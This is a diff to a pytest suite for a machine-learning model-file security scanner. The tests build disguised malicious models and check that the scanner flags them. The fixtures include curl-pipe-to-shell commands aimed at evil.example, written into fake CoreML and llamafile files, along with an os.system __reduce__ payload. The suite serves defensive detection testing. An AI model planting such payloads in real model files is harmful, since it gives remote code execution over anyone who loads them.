 def test_scan_file_detects_malicious_tf_savedmodel_renamed_with_meta_suffix(tmp_path: Path) -> None:
-    disguised_savedmodel = tmp_path / "saved.meta"
-    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())
-
-    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "tf_savedmodel"
-    assert result.success is False
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
-        for issue in result.issues
-    )
+    _assert_misnamed_tf_savedmodel_detection(tmp_path, ("saved.meta"))
 
 
 def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: Path) -> None:
@@ -18279,3 +17623,342 @@ def test_scan_file_xgboost_generation_config_runs_selected_jinja_when_manifest_e
         check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
         for check in result.checks
     )
+
+
+def _record_directory_owner_scans(monkeypatch: pytest.MonkeyPatch, scanner_class: type[BaseScanner]) -> list[Path]:
+    owner_calls: list[Path] = []
+    original_scan = scanner_class.scan
+
+    def record_savedmodel_scan(scanner: BaseScanner, path: str) -> ScanResult:
+        if Path(path).is_dir():
+            owner_calls.append(Path(path).resolve())
+        return original_scan(scanner, path)
+
+    monkeypatch.setattr(scanner_class, "scan", record_savedmodel_scan)
+    return owner_calls
+
+
+def _record_shard_scans(
+    monkeypatch: pytest.MonkeyPatch, blob_paths: list[Path]
+) -> tuple[list[dict[str, Any]], list[str]]:
+    captured_configs: list[dict[str, Any]] = []
+    return captured_configs, _record_shard_calls(monkeypatch, blob_paths, captured_configs)
+
+
+def _switch_keras_availability(monkeypatch: pytest.MonkeyPatch) -> list[bool]:
+    original_load_scanner = core_module._registry._load_scanner
+    keras_scanner_available = [True]
+
+    def load_scanner(scanner_id: str) -> type[Any] | None:
+        if scanner_id == "keras_zip" and not keras_scanner_available[0]:
+            return None
+        return original_load_scanner(scanner_id)
+
+    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
+    return keras_scanner_available
+
+
+def _assert_flax_overlap_routed(tmp_path: Path, suffix: str) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / f"malicious{suffix}"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+def _assert_truncated_mxnet_routing(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    case_filename: str,
+    case_prefix: str,
+    case_padding_length: int,
+    case_suffix: str,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    config_path = tmp_path / case_filename
+    config_path.write_text(
+        case_prefix + ("x" * case_padding_length) + case_suffix,
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(config_path))
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
+
+
+def _assert_tokenizer_jax_template_composition(tmp_path: Path, case_filename: str, case_late_fields: str) -> None:
+    tokenizer_path = _write_ordered_hf_tokenizer_json(
+        tmp_path / case_filename,
+        late_fields=(case_late_fields),
+    )
+
+    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "jinja2_template"
+    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
+    assert any(
+        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def _assert_safetensors_pickle_stack_routing(tmp_path: Path, case_pickle_tail: bytes, case_filename: str) -> None:
+    pickle_tail = case_pickle_tail
+    polyglot = tmp_path / case_filename
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def _assert_late_pickle_stop_in_msgpack(
+    tmp_path: Path, case_filename: str, case_pickle_prefix: bytes, case_pickle_suffix: bytes
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / case_filename
+    pickle_stream = (
+        case_pickle_prefix + (b"N0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 2 + 1)) + case_pickle_suffix
+    )
+    checkpoint.write_bytes(
+        pickle_stream
+        + flax_msgpack_scanner.msgpack.packb(
+            {"params": {"w": [1, 2, 3]}},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert any(
+        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
+        for issue in result.issues
+    )
+
+
+def _assert_bounded_jax_prefix_coverage(tmp_path: Path, case_filename: str) -> None:
+    model_path = tmp_path / case_filename
+    deep_value: object = "benign"
+    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
+        deep_value = [deep_value]
+    model_path.write_text(
+        json.dumps(
+            {
+                "framework": "jax",
+                "deep": deep_value,
+                "payload": "jax.experimental.io_callback",
+                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
+            }
+        ),
+        encoding="utf-8",
+    )
+
+    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+
+    assert core_module.determine_exit_code(aggregate) == 1
+    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
+    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"
+    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]
+
+
+def _assert_generic_zip_schema_near_match(tmp_path: Path, case_filename: str, case_member_name: str) -> None:
+    disguised_zip = tmp_path / case_filename
+    _create_misnamed_zip(
+        disguised_zip,
+        {
+            case_member_name: json.dumps(
+                {
+                    "__class__": "Pipeline",
+                    "__module__": "sklearn.pipeline",
+                    "__loader__": "ObjectNode",
+                    "content": {},
+                }
+            ).encode("utf-8"),
+        },
+    )
+
+    result = scan_file(str(disguised_zip))
+
+    assert result.scanner_name == "zip"
+    assert not any("CVE-2025-" in check.name for check in result.checks)
+
+
+def _assert_malicious_misnamed_onnx_format_issue(tmp_path: Path, case_filename: str) -> None:
+    pytest.importorskip("onnx")
+    disguised_onnx = _create_budgeted_onnx_candidate(tmp_path / case_filename, op_type="PythonOp")
+
+    result = scan_file(str(disguised_onnx), config={"cache_enabled": False})
+    format_check = _format_validation_check(result)
+
+    assert result.scanner_name == "onnx"
+    assert format_check.severity == IssueSeverity.WARNING
+    assert format_check.rule_code == "S901"
+    assert _actionable_s901_issues(result)
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
+def _assert_misnamed_coreml_custom_layer(tmp_path: Path, prefix: bytes, case_filename: str) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / case_filename,
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def _assert_empty_stack_global_collision_clean(tmp_path: Path, case_filename: str, case_pickle_tail: bytes) -> None:
+    polyglot = tmp_path / case_filename
+    _write_safetensors_pickle_tail(polyglot, ord("V"), case_pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def _assert_generic_zip_pickle_routing(
+    tmp_path: Path, case_filename: str, case_member_name: str, case_version: bytes
+) -> None:
+    disguised_zip = tmp_path / case_filename
+    _create_misnamed_zip(
+        disguised_zip,
+        {
+            case_member_name: pickle.dumps({"weights": [1, 2, 3]}),
+            "version": case_version,
+        },
+    )
+
+    result = scan_file(str(disguised_zip))
+
+    assert result.scanner_name == "zip"
+
+
+def _assert_misnamed_llamafile_detection(tmp_path: Path, case_filename: str) -> None:
+    disguised_llamafile = tmp_path / case_filename
+    disguised_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    result = scan_file(str(disguised_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def _assert_generic_json_existing_owner(tmp_path: Path, case_prefix: str) -> None:
+    config_path = tmp_path / "config.json"
+    config_path.write_text(
+        case_prefix + ",".join("0" for _ in range(5000)) + "]}",
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(config_path))
+
+    assert result.scanner_name == "manifest"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+
+
+def _assert_misnamed_tf_savedmodel_detection(tmp_path: Path, case_filename: str) -> None:
+    disguised_savedmodel = tmp_path / case_filename
+    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())
+
+    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_savedmodel"
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def _assert_xgboost_json_pattern(model_path: Path) -> None:
+    result = scan_file(str(model_path), config={"cache_enabled": False})
+    assert result.scanner_name == "xgboost"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def _assert_xgboost_params_signature(model_path: Path) -> None:
+    result = scan_file(str(model_path), config={"cache_enabled": False})
+    assert result.scanner_name == "xgboost"
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+
+
+def _hide_descriptor_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    original_stat = Path.stat
+
+    def hide_descriptor_aliases(candidate: Path, *args: Any, **kwargs: Any) -> os.stat_result:
+        if str(candidate).startswith(("/proc/self/fd/", "/dev/fd/")):
+            raise FileNotFoundError(str(candidate))
+        return original_stat(candidate, *args, **kwargs)
+
+    monkeypatch.setattr(Path, "stat", hide_descriptor_aliases)
+
+
+def _reject_owner_before_containment(monkeypatch: pytest.MonkeyPatch, scanner_class: type[BaseScanner]) -> list[str]:
+    owner_calls: list[str] = []
+
+    def record_owner_scan(_scanner: BaseScanner, owner_path: str) -> ScanResult:
+        owner_calls.append(owner_path)
+        raise AssertionError("owner scan must not run before path containment")
+
+    monkeypatch.setattr(scanner_class, "scan", record_owner_scan)
+    return owner_calls
+
+
+def _record_shard_calls(
+    monkeypatch: pytest.MonkeyPatch,
+    blob_paths: list[Path],
+    captured_configs: list[dict[str, Any]] | None = None,
+) -> list[str]:
+    calls: list[str] = []
+
+    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
+        calls.append(path)
+        if captured_configs is not None:
+            captured_configs.append(dict(config or {}))
+        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))
+
+    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)
+    return calls
